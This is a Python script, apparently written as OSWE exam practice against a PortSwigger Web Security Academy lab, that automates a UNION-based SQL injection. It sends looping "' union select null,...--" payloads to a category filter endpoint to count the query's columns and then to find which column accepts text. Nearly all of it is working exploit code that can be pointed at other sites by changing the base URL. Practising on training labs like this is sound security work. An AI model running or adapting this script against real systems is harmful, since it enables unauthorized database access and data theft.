import requests
import json
import urllib

# Description:
# An automated SQL 'Union based' exploit script to perform the following:
# (1) identify number of columns
# (2) identify which column are String type
# (3) inject query
#
# This is my OSWE prep to better python scripting skills. 
# The lab used for this practice can be found in Portswigger Academy
# Web Security Academy > SQL injection > UNION attacks > Lab

# URL of target

#modify here ---------
baseURL = "https://0ab500db0405e681c0564ebe0060004d.web-security-academy.net"
providedString = "'kvXZWU'"
#modify end ----------

# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

exploitURL = baseURL + "/filter?category="
loginURL = baseURL + "/login"

found = False;
col_index = 0  # counter for no. of columns

#--(i) detect columns--------------------------------------------------
print("Detecting no of columns with union attack...")

while(found == False):
	payload = "' union select {}null--".format(col_index*'null,')
	res = requests.get(url = exploitURL+payload)
	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	if (res.status_code == 200):
		found = True
		break
	else:
		col_index=col_index+1

col_count = col_index+1
print(" [+] Found! Total columns detected = {}\n".format(col_count))

#--(i) detect column with text--------------------------------------------------
print("2 Detecting column with text")
found = False
# colText = 0 # counter for which column is string type

# Make the database retrieve the string: 'fk6EB0'
for index in range(col_count):
	array = ['null'] * col_count
	array[index] = providedString
	stringWithComma = ",".join(array) 
	payload = "' union select {}--".format(stringWithComma)

	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	res = requests.get(url = exploitURL+payload)
	if res.status_code == 200:	
		print(" [+] Found! column index {} is a string type\n".format(index))
		# colText = index
	if "Congratulations" in res.text:
		print(" [+] 'Congratulations' is found in response!")
